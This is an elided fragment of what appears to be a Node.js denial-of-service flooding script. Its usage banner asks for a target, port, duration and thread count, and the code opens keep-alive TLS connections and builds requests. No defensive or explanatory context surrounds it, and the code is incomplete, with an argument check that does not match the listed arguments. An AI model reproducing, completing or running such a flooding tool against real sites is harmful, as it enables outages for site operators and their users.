...
if (process.argv.length !== 5) {
    console.log(`                       
Usage: node ${path.basename(__filename)} [TARGET] [PORT] [TIME] [THREAD]
Usage: node ${path.basename(__filename)} [http://example.com] [443] [60] [30]
------------------------------------------------------------------
...
TlsConnection.setKeepAlive(true, 80000)
TlsConnection.setTimeout(80000);
var r = BuildRequest();
